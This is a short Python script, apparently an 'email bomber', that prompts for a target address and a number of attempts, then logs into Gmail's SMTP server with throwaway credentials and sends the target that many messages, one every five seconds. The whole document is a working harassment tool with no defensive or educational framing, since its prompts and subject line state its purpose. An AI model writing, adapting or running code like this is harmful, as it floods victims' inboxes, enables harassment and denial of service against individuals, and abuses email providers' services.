from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time

lst = []

try:
    count = int(input("Enter number of attempt you wanna to do: "))
    email = str(input("Target Email Address: "))
except:
  print("An exception occurred")


# iterating till the range
for i in range(0, count):
    message = MIMEMultipart()
    message["From"] = "Sender_Name"                         #your sender name
    message["To"] = email
    message["Subject"] = "Email_Bomber"                     #your subject
    message.attach(MIMEText("Your text messages"))
    with smtplib.SMTP(host="smtp.gmail.com",port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("you fake email address","password")
        smtp.send_message(message)
        print("Sent....")
    time.sleep(5)                                           #delay for 5 second in sending email


